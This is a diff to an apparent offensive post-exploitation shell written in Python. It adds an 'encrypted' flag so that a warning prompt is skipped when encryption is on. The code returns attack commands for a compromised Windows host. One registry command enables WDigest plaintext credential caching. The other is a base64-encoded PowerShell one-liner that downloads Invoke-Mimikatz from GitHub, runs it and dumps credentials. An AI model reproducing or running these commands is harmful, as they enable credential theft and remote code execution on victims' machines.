@@ -41,7 +41,7 @@ def postExpHelp():
     print("   Reg stuff:\tFun post-exp registry stuff here(TODO)\n".expandtabs(40))
 
 showArt = True
-def postExpShell():
+def postExpShell(encrypted):
     global showArt
     if showArt:
         postExpWelcome()
@@ -74,13 +74,16 @@ def postExpShell():
             return "reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1"
 
         elif user_input.lower() == "mimikatz":
-            print("Communication is currently not encrypted (this is coming soon). Anybody with your alert and auth tokens can see the result of this command.")
-            choice = input("Do you want to continue  (y/n): ")
-            if choice.lower() == "y" or choice.lower() == "yes":
+            if encrypted:
                 return "powershell.exe -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AUABvAHcAZQByAFMAaABlAGwAbABNAGEAZgBpAGEALwBQAG8AdwBlAHIAUwBwAGwAbwBpAHQALwBmADYANQAwADUAMgAwAGMANABiADEAMAAwADQAZABhAGYAOABiADMAZQBjADAAOAAwADAANwBhADAAYgA5ADQANQBiADkAMQAyADUAMwBhAC8ARQB4AGYAaQBsAHQAcgBhAHQAaQBvAG4ALwBJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAuAHAAcwAxACcAKQA7ACAASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoAIAAtAEQAdQBtAHAAQwByAGUAZABzAA=="
-
             else:
-                return "echo smart choice :)"
+                print("Communication is currently not encrypted (this is coming soon). Anybody with your alert and auth tokens can see the result of this command.")
+                choice = input("Do you want to continue  (y/n): ")
+                if choice.lower() == "y" or choice.lower() == "yes":
+                    return "powershell.exe -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AUABvAHcAZQByAFMAaABlAGwAbABNAGEAZgBpAGEALwBQAG8AdwBlAHIAUwBwAGwAbwBpAHQALwBmADYANQAwADUAMgAwAGMANABiADEAMAAwADQAZABhAGYAOABiADMAZQBjADAAOAAwADAANwBhADAAYgA5ADQANQBiADkAMQAyADUAMwBhAC8ARQB4AGYAaQBsAHQAcgBhAHQAaQBvAG4ALwBJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAuAHAAcwAxACcAKQA7ACAASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoAIAAtAEQAdQBtAHAAQwByAGUAZABzAA=="
+
+                else:
+                    return "echo smart choice :)"
 
         else:
             print(Fore.RED + "[-]" + Fore.RESET + " Unknown command: " + user_input)
